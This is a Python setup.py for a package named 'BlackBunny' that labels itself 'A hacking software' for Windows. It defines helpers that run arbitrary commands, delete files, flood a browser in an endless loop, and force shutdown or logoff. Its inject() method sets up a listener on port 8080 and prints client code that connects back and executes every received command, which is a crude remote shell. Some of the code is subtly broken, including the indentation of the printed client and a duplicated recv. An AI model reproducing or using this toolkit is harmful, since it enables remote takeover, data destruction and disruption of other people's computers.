import os
import webbrowser
from socket import gethostbyname, gethostname
import sys
import socket
from setuptools import setup, find_packages
import pyautogui

print('                     |BlackBunny|\n WARNING: Only works on Windows 10, Windows 7, Windows 8, Windows 8.1')
print('Created: August 4, 2021 | Thank you for using')

VERSION = '0.0.1'
DESCRIPTION = 'A hacking software'
setup(
    name="BlackBunny",
    version=VERSION,
    author="BtPlayzX",
    author_email="bradytrudel@outlook.com",
    packages=find_packages(),
    install_requires=['pyautogui'],
    keywords=['python','black','bunny'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
    ]
)

class blackbunny():
    def command(cmd):
        os.system(cmd)
    def display_remote_shutdown_log():
        os.system('shutdown -i')
    def drink(file):
        os.system(f'del {file}')
    def flood_browser(website, times_flood):
        if times_flood == 'INF':
            while True:
                webbrowser.open(website)
        for i in range(times_flood):
            webbrowser.open(website)
    def get_files():
        os.system('tree')
        
    def get_ip_address():
        ip = gethostbyname(gethostname())
        print(ip)
    def title_terminal(terminal_name):
        os.system(f'title {terminal_name}')
    def exit_with_code(exit_code):
        sys.exit(exit_code)
    def inject(injection_code):
        if injection_code == 'BAC6SJ':
            s = socket.socket()
            host = gethostbyname(gethostname())
            port  = 8080
            s.bind((host,port))
            s.listen()
            print(f'Wating for a incoming connection to target your IP address {host} and the port is 8080.')
            print('Please type the following code on the other machine: ')
            print('import os')
            print('import socket')
            print('s = socket.socket()')
            print('port = 8080')
            print(f'host = "{socket.gethostbyname(socket.gethostname())}"')
            print('s.connect((host, port))')
            print('while True:\n    command = s.recv(1024)\n    command = command.decode()\n    os.system(f"{command}")\n   s.send("Executed")')
            print('END OF CODE')
            conn, addr = s.accept()
            print(f'{addr} entered')
            while True:
                command = input(str(f"Run a command on {addr}: "))
                conn.send(command.encode())
                print('Command sent waiting for execution...')
                conn.recv(1024)
                executed = conn.recv(5000)
                executed = executed.decode()
                print(executed)
        elif injection_code == 'OFP886':
            os.system('shutdown /s')
        elif injection_code == 'LOG878':
            os.system('shutdown /l')
    def guiDialog(TITLE, TEXT, BUTTON):
        pyautogui.alert(title=TITLE, text=TEXT, button=BUTTON)
        
                
            

    def injection_codes():
        print('BAC6SJ\nOFP886\nLOG878')
        print('More codes coming soon')


